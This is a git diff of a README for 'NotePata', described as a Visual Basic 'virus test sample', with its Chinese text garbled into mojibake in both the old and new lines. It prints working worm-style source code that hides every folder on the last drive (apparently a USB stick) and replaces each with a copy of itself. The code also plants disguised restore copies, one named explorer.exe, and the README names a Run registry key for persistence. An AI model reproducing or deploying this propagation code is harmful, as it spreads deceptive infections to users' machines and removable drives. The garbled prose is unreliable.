@@ -1,63 +1,63 @@
-# **NotePata - »ùÓÚVisual BasicµÄ²¡¶¾²âÊÔÑù±¾**  
-##### **ÉùÃ÷£º±¾³ÌÐòÎª²âÊÔÑù±¾£¬±¾ÉíÎÞÊµ¼ÊÎ£º¦ÐÔ£»ÇÐÎðÊ¹ÓÃÆä´ÓÊÂÎ£º¦¼ÆËã»úÏµÍ³µÄ»î¶¯£¬ÈçÒò²»µ±²Ù×÷Ôì³ÉÎ£º¦£¬¸Å²»¸ºÔð¡£**  
-**³ÌÐò¼°Ô´ÂëÎÄ¼þµÈÐ£ÑéÂëÇë[[µã´Ë]](/shamd5.md "µã´Ë")**
-- ## Ç°ÇéÌáÒª
-**2023Äê5ÔÂ£¬  
-Ñ§Ð£µÄµçÄÔ³öÏÖÁËÒ»¸ö²¡¶¾. . .  
-Õâ¸ö²¡¶¾ÓëÒÔÍùµÄ²¡¶¾²»Í¬¡£  
-²»ÏñÄ¾Âí²¡¶¾£¬ÒþÃØÓÖÐ×ÏÕ£¬  
-²»ÏñÈä³æ²¡¶¾£¬¶ñ¶¾¶øÎÞÇé£¬  
-¸ü²»ÏñÀÕË÷²¡¶¾£¬ÇÃÕ©ÀÕË÷ÎÞ¹¼µÄÉè±¸¡£  
-Ö»ÊÇÔÚÒ³Ãæµ×ÏÂ£¬³öÏÖÒ»¸ö³õÒô×À³è£¬  
-ÔÚµ×²¿À¸»î¶¯¡¢±¼ÅÜ¡¢ÌøÔ¾¡£  
-Ò»ÔÂÖ®¼ä£¬¸Ã²¡¶¾´«±é¸÷¸ö½ÌÊÒ¡£  
-²»Öª²¡¶¾ÓÉºÎ¶øÀ´£¬  
-Ö»ÊÇ£¬  
-Í¬Ñ§Ð£Ïà´¦µÄ×îºóÒ»¸öÔÂ£¬  
-¶àÁËÒ»·ÝÌØ±ðµÄ¹ÒÄî. . .  **  
-- ## Ñù±¾¼ò½é
-**¸ÃÑù±¾Îª·ÂÕÕÑ§Ð£²¡¶¾£¬ÎÞ¶¾µ«¾ßÓÐÒ»¶¨´«²¥Á¦µÄ¼ÆËã»ú²¡¶¾£¬ÓÉ `CFIT` ÓÚ `2023/7/1` Æð±àÐ´¶ø³É¡£**
-- ## Ñù±¾Ô­Àí
-- #####ÎÄ¼þ¼Ð¸ÐÈ¾
-**ÎÄ¼þ¼Ð¸ÐÈ¾º¯ÊýÓÉÖ÷Ìâº¯Êý```ShowFileList()```ÊµÏÖ¡£
-º¯Êý´úÂëÈçÏÂ£º**
+# **NotePata - åŸºäºŽVisual Basicçš„ç—…æ¯’æµ‹è¯•æ ·æœ¬**  
+##### **å£°æ˜Žï¼šæœ¬ç¨‹åºä¸ºæµ‹è¯•æ ·æœ¬ï¼Œæœ¬èº«æ— å®žé™…å±å®³æ€§ï¼›åˆ‡å‹¿ä½¿ç”¨å…¶ä»Žäº‹å±å®³è®¡ç®—æœºç³»ç»Ÿçš„æ´»åŠ¨ï¼Œå¦‚å› ä¸å½“æ“ä½œé€ æˆå±å®³ï¼Œæ¦‚ä¸è´Ÿè´£ã€‚**  
+**ç¨‹åºåŠæºç æ–‡ä»¶ç­‰æ ¡éªŒç è¯·[[ç‚¹æ­¤]](/shamd5.md "ç‚¹æ­¤")**
+- ## å‰æƒ…æè¦
+**2023å¹´5æœˆï¼Œ  
+å­¦æ ¡çš„ç”µè„‘å‡ºçŽ°äº†ä¸€ä¸ªç—…æ¯’. . .  
+è¿™ä¸ªç—…æ¯’ä¸Žä»¥å¾€çš„ç—…æ¯’ä¸åŒã€‚  
+ä¸åƒæœ¨é©¬ç—…æ¯’ï¼Œéšç§˜åˆå‡¶é™©ï¼Œ  
+ä¸åƒè •è™«ç—…æ¯’ï¼Œæ¶æ¯’è€Œæ— æƒ…ï¼Œ  
+æ›´ä¸åƒå‹’ç´¢ç—…æ¯’ï¼Œæ•²è¯ˆå‹’ç´¢æ— è¾œçš„è®¾å¤‡ã€‚  
+åªæ˜¯åœ¨é¡µé¢åº•ä¸‹ï¼Œå‡ºçŽ°ä¸€ä¸ªåˆéŸ³æ¡Œå® ï¼Œ  
+åœ¨åº•éƒ¨æ æ´»åŠ¨ã€å¥”è·‘ã€è·³è·ƒã€‚  
+ä¸€æœˆä¹‹é—´ï¼Œè¯¥ç—…æ¯’ä¼ éå„ä¸ªæ•™å®¤ã€‚  
+ä¸çŸ¥ç—…æ¯’ç”±ä½•è€Œæ¥ï¼Œ  
+åªæ˜¯ï¼Œ  
+åŒå­¦æ ¡ç›¸å¤„çš„æœ€åŽä¸€ä¸ªæœˆï¼Œ  
+å¤šäº†ä¸€ä»½ç‰¹åˆ«çš„æŒ‚å¿µ. . .**  
+- ## æ ·æœ¬ç®€ä»‹
+**è¯¥æ ·æœ¬ä¸ºä»¿ç…§å­¦æ ¡ç—…æ¯’ï¼Œæ— æ¯’ä½†å…·æœ‰ä¸€å®šä¼ æ’­åŠ›çš„è®¡ç®—æœºç—…æ¯’ï¼Œç”± `CFIT` äºŽ `2023/7/1` èµ·ç¼–å†™è€Œæˆã€‚**
+- ## æ ·æœ¬åŽŸç†
+- ##### æ–‡ä»¶å¤¹æ„ŸæŸ“
+**æ–‡ä»¶å¤¹æ„ŸæŸ“å‡½æ•°ç”±ä¸»é¢˜å‡½æ•°```ShowFileList()```å®žçŽ°ã€‚
+å‡½æ•°ä»£ç å¦‚ä¸‹ï¼š**
 ```vb
-Private Sub ShowFileList(folderspec) 'Ö÷Ìå¸ÐÈ¾º¯Êý
+Private Sub ShowFileList(folderspec) 'ä¸»ä½“æ„ŸæŸ“å‡½æ•°
 On Error GoTo bbzlp0
 Dim fs, f, f1, fc
-If CreateObject("Scripting.FileSystemObject").DriveExists(folderspec) Then 'ÅÐ¶ÏÖ¸¶¨ÅÌÊÇ·ñ´æÔÚ
+If CreateObject("Scripting.FileSystemObject").DriveExists(folderspec) Then 'åˆ¤æ–­æŒ‡å®šç›˜æ˜¯å¦å­˜åœ¨
 Set fs = CreateObject("Scripting.FileSystemObject")
 Set f = fs.getfolder(folderspec)
 Set fc = f.SubFolders
-For Each f1 In fc 'ÏÈÉ¨ÃèÖ¸¶¨ÅÌµÄËùÓÐÎÄ¼þ¼Ð
+For Each f1 In fc 'å…ˆæ‰«ææŒ‡å®šç›˜çš„æ‰€æœ‰æ–‡ä»¶å¤¹
 Debug.Print folderspec + "\" + f1.Name + "\"
-If f1.Name <> "System Volume Information" Then 'ÅÅ³ý"System Volume Information"ÎÄ¼þ¼Ð
-SetAttr folderspec + "\" + f1.Name + "\", vbHidden 'Òþ²ØÉ¨ÃèµÄÎÄ¼þ¼Ð
+If f1.Name <> "System Volume Information" Then 'æŽ’é™¤"System Volume Information"æ–‡ä»¶å¤¹
+SetAttr folderspec + "\" + f1.Name + "\", vbHidden 'éšè—æ‰«æçš„æ–‡ä»¶å¤¹
 If Dir(folderspec + "\" + f1.Name + ".exe") = "" Then
-FileCopy App.Path + "\" + App.EXEName + ".exe", folderspec + "\" + f1.Name + ".exe" 'Ìæ»»ÎªÒÔ¸ÐÈ¾ÎÄ¼þ¼ÐÎªÃû³ÆµÄÓ¦ÓÃ³ÌÐò£¨ÆäÊµ¾ÍÊÇ¸´ÖÆ²¡¶¾±¾Ìå£©
+FileCopy App.Path + "\" + App.EXEName + ".exe", folderspec + "\" + f1.Name + ".exe" 'æ›¿æ¢ä¸ºä»¥æ„ŸæŸ“æ–‡ä»¶å¤¹ä¸ºåç§°çš„åº”ç”¨ç¨‹åºï¼ˆå…¶å®žå°±æ˜¯å¤åˆ¶ç—…æ¯’æœ¬ä½“ï¼‰
 End If
 End If
-If Dir("C:\Backups\", vbDirectory) = "" Then '²¡¶¾Notepata±¾ÌåÎÄ¼þ¼Ð
+If Dir("C:\Backups\", vbDirectory) = "" Then 'ç—…æ¯’Notepataæœ¬ä½“æ–‡ä»¶å¤¹
 fs.createfolder ("C:\Backups\")
 End If
-If Dir("D:\Setup\", vbDirectory) = "" Then '²¡¶¾explorer´úÀíÎÄ¼þ¼Ð
+If Dir("D:\Setup\", vbDirectory) = "" Then 'ç—…æ¯’explorerä»£ç†æ–‡ä»¶å¤¹
 fs.createfolder ("D:\Setup\")
 End If
 If Dir("C:\Backups\notepata.exe") = "" Then
-FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Backups\notepata.exe" '±¾Ìå±»É¾³ý£¬ÓÉ´Ë»Ö¸´
+FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Backups\notepata.exe" 'æœ¬ä½“è¢«åˆ é™¤ï¼Œç”±æ­¤æ¢å¤
 End If
 If Dir("D:\Setup\explorer.exe") = "" Then
-FileCopy App.Path + "\" + App.EXEName + ".exe", "D:\Setup\explorer.exe" '´úÀí±»É¾³ý£¬ÓÉ´Ë»Ö¸´
+FileCopy App.Path + "\" + App.EXEName + ".exe", "D:\Setup\explorer.exe" 'ä»£ç†è¢«åˆ é™¤ï¼Œç”±æ­¤æ¢å¤
 End If
-If App.EXEName <> "notepata" And App.EXEName <> "explorer" And Me.Enabled = True Then 'ÆäÓàÇé¿öÏÂ£¬Èô·Ç±¾Ìå¼°´úÀí£¬ÔòÖ»Ö´ÐÐÎÄ¼þ¼Ð´ò¿ª²Ù×÷
-Shell "explorer " + Chr(34) + folderspec + App.EXEName + Chr(34), vbNormalFocus '´ò¿ª²¡¶¾Ãû³ÆµÄÎÄ¼þ¼Ð
-Me.Enabled = False '½ûÓÃÆäÓàÐÐÎª
-Timer1.Enabled = False '½ûÓÃÆäÓàÐÐÎª
-Timer2.Enabled = False '½ûÓÃÆäÓàÐÐÎª
-Timer3.Enabled = False '½ûÓÃÆäÓàÐÐÎª
-Timer4.Enabled = False '½ûÓÃÆäÓàÐÐÎª
-Timer5.Enabled = False '½ûÓÃÆäÓàÐÐÎª
-Timer6.Enabled = False '½ûÓÃÆäÓàÐÐÎª
+If App.EXEName <> "notepata" And App.EXEName <> "explorer" And Me.Enabled = True Then 'å…¶ä½™æƒ…å†µä¸‹ï¼Œè‹¥éžæœ¬ä½“åŠä»£ç†ï¼Œåˆ™åªæ‰§è¡Œæ–‡ä»¶å¤¹æ‰“å¼€æ“ä½œ
+Shell "explorer " + Chr(34) + folderspec + App.EXEName + Chr(34), vbNormalFocus 'æ‰“å¼€ç—…æ¯’åç§°çš„æ–‡ä»¶å¤¹
+Me.Enabled = False 'ç¦ç”¨å…¶ä½™è¡Œä¸º
+Timer1.Enabled = False 'ç¦ç”¨å…¶ä½™è¡Œä¸º
+Timer2.Enabled = False 'ç¦ç”¨å…¶ä½™è¡Œä¸º
+Timer3.Enabled = False 'ç¦ç”¨å…¶ä½™è¡Œä¸º
+Timer4.Enabled = False 'ç¦ç”¨å…¶ä½™è¡Œä¸º
+Timer5.Enabled = False 'ç¦ç”¨å…¶ä½™è¡Œä¸º
+Timer6.Enabled = False 'ç¦ç”¨å…¶ä½™è¡Œä¸º
 End If
 Next
 Else
@@ -65,38 +65,38 @@ DoEvents
 End If
 bbzlp0:
 If Err.Number > 0 Then
-HandleErr '´íÎó´¦Àí
+HandleErr 'é”™è¯¯å¤„ç†
 End If
 End Sub
 ```
-- #####´«²¥Ô­Àí
-**ÓÉÒÔÉÏ´úÂë£¬Í¨¹ý½«Ö¸¶¨ÅÌ·û£¨×îºóÒ»¸öÅÌ·û£¬½«ÓÚÒÔÏÂÌá¼°£©ÄÚËùÓÐÎÄ¼þ¼ÐÒþ²Ø£¬Ìæ»»ÎªÒÔÎÄ¼þ¼ÐÃû³ÆÃüÃûµÄ²¡¶¾³ÌÐò£¬Í¨¹ý²¡¶¾³ÌÐò½øÒ»²½¸ÐÈ¾¡£  
-È·¶¨×îºóÒ»¸öÅÌ·û´úÂëÈçÏÂ£º  **
+- ##### ä¼ æ’­åŽŸç†
+**ç”±ä»¥ä¸Šä»£ç ï¼Œé€šè¿‡å°†æŒ‡å®šç›˜ç¬¦ï¼ˆæœ€åŽä¸€ä¸ªç›˜ç¬¦ï¼Œå°†äºŽä»¥ä¸‹æåŠï¼‰å†…æ‰€æœ‰æ–‡ä»¶å¤¹éšè—ï¼Œæ›¿æ¢ä¸ºä»¥æ–‡ä»¶å¤¹åç§°å‘½åçš„ç—…æ¯’ç¨‹åºï¼Œé€šè¿‡ç—…æ¯’ç¨‹åºè¿›ä¸€æ­¥æ„ŸæŸ“ã€‚  
+ç¡®å®šæœ€åŽä¸€ä¸ªç›˜ç¬¦ä»£ç å¦‚ä¸‹ï¼š**
 ```vb
-'´ËÇ°±äÁ¿¶¨ÒåµÈ´úÂëÊ¡ÂÔ
-StrDrive = String(100, Chr$(0)) '³õÊ¼»¯ÅÌ·û´®
-Call GetLogicalDriveStrings(100, StrDrive) '·µ»ØÅÌ·û´®£¨·µ»ØÖµÈç"C:\D:\E:\..."£©
-'...ÖÐ¼ä´úÂëÊ¡ÂÔ
-DriveID = Split(StrDrive, Chr$(0)) '·µ»Ø¹âÅÌÅÌ·ûµ½Êý×éDeiveID²¢Öð×Ö·û·ÖÀë
+'æ­¤å‰å˜é‡å®šä¹‰ç­‰ä»£ç çœç•¥
+StrDrive = String(100, Chr$(0)) 'åˆå§‹åŒ–ç›˜ç¬¦ä¸²
+Call GetLogicalDriveStrings(100, StrDrive) 'è¿”å›žç›˜ç¬¦ä¸²ï¼ˆè¿”å›žå€¼å¦‚"C:\D:\E:\..."ï¼‰
+'...ä¸­é—´ä»£ç çœç•¥
+DriveID = Split(StrDrive, Chr$(0)) 'è¿”å›žå…‰ç›˜ç›˜ç¬¦åˆ°æ•°ç»„DeiveIDå¹¶é€å­—ç¬¦åˆ†ç¦»
 For ii = 0 To UBound(DriveID)
 If InStr(DriveID(ii), ":") <> 0 Then
 av = av + 1
 avail(av) = DriveID(ii)
 End If
 Next ii
-S = avail(av) '»ñµÃ×îÄ©ÅÌ·û£¨Èô¿ÉÒÆ¶¯Ó²ÅÌÎªUÅÌ£¬Ôò¸ÐÈ¾ÅÌÎªUÅÌ£©
-ShowFileList S 'µ÷ÓÃÉÏÊö¸ÐÈ¾ºËÐÄº¯Êý
+S = avail(av) 'èŽ·å¾—æœ€æœ«ç›˜ç¬¦ï¼ˆè‹¥å¯ç§»åŠ¨ç¡¬ç›˜ä¸ºUç›˜ï¼Œåˆ™æ„ŸæŸ“ç›˜ä¸ºUç›˜ï¼‰
+ShowFileList S 'è°ƒç”¨ä¸Šè¿°æ„ŸæŸ“æ ¸å¿ƒå‡½æ•°
 ```
-**³ý´ËÖ®Íâ£¬±¾Ñù±¾ÊµÏÖ¼ÓÈë¿ª»úÆô¶¯Ïî£¬Ê¹ÓÃ×¢²á±íÊµÏÖ¡£  
-×¢²á±íÏî£º`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`**
-**±¾Ñù±¾Òà´æÔÚ´úÀí³ÌÐò£¬ÓÃÓÚ²¡¶¾É¾³ýºó»Ö¸´µÈ¡£¾ßÌå´ÓÔ´Âë×¢ÊÍÖÐÀí½â¡£**
-- #####×À³èÔ­Àí
-±¾Ñù±¾Ê¹ÓÃÍ¼Æ¬ÖðÖ¡·ÖÖ¡ÊµÏÖ¶¯Í¼Ð§¹û¡£
-ÖðÖ¡Í¼Æ¬ÈçÏÂ£º
-[![](https://cdn.jsdelivr.net/gh/CFITCorporation/cfitpic@a66715cf1fefc989390869a733b68df61c321c82/pic/2023/07/05/c9b0b75052bc2171ad6afa68cf9f2fe6.png)](./ "ÖðÖ¡Í¼Æ¬")  
+**é™¤æ­¤ä¹‹å¤–ï¼Œæœ¬æ ·æœ¬å®žçŽ°åŠ å…¥å¼€æœºå¯åŠ¨é¡¹ï¼Œä½¿ç”¨æ³¨å†Œè¡¨å®žçŽ°ã€‚  
+æ³¨å†Œè¡¨é¡¹ï¼š`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`**
+**æœ¬æ ·æœ¬äº¦å­˜åœ¨ä»£ç†ç¨‹åºï¼Œç”¨äºŽç—…æ¯’åˆ é™¤åŽæ¢å¤ç­‰ã€‚å…·ä½“ä»Žæºç æ³¨é‡Šä¸­ç†è§£ã€‚**
+- ##### æ¡Œå® åŽŸç†
+**æœ¬æ ·æœ¬ä½¿ç”¨å›¾ç‰‡é€å¸§åˆ†å¸§å®žçŽ°åŠ¨å›¾æ•ˆæžœã€‚
+é€å¸§å›¾ç‰‡å¦‚ä¸‹ï¼š**
+[![](https://cdn.jsdelivr.net/gh/CFITCorporation/cfitpic@a66715cf1fefc989390869a733b68df61c321c82/pic/2023/07/05/c9b0b75052bc2171ad6afa68cf9f2fe6.png)](./ "é€å¸§å›¾ç‰‡")  
 
-**Í¬Ñù£¬±¾Ñù±¾ÊµÏÖ¹â±êÎüÒý¡¢ÎÞ²Ù×÷6sºó¿ªÊ¼»î¶¯µÈ¹¦ÄÜ£¬¾ßÌå´ÓÔ´Âë×¢ÊÍÖÐÀí½â¡£**  
-- ## ×÷Õß
-**±¾³ÌÐòÑù±¾ÓÉ`CFIT`¶ÀÁ¢ÊµÏÖ¡£**
-- ## ×¢Òâ
-**ÈçÓÐÈËÏòÄú´«²¥¸Ã²¡¶¾²¢ÒªÇóÄú²âÊÔ£¬ÇëºË¶Ô±¾ÎÄ¼þÍ·²¿Ð£ÑéÂëºó²Ù×÷£¬·ñÔòºó¹û×Ô¸º¡£**
+**åŒæ ·ï¼Œæœ¬æ ·æœ¬å®žçŽ°å…‰æ ‡å¸å¼•ã€æ— æ“ä½œ6såŽå¼€å§‹æ´»åŠ¨ç­‰åŠŸèƒ½ï¼Œå…·ä½“ä»Žæºç æ³¨é‡Šä¸­ç†è§£ã€‚**  
+- ## ä½œè€…
+**æœ¬ç¨‹åºæ ·æœ¬ç”±`CFIT`ç‹¬ç«‹å®žçŽ°ã€‚**
+- ## æ³¨æ„
+**å¦‚æœ‰äººå‘æ‚¨ä¼ æ’­è¯¥ç—…æ¯’å¹¶è¦æ±‚æ‚¨æµ‹è¯•ï¼Œè¯·æ ¸å¯¹æœ¬æ–‡ä»¶å¤´éƒ¨æ ¡éªŒç åŽæ“ä½œï¼Œå¦åˆ™åŽæžœè‡ªè´Ÿã€‚**
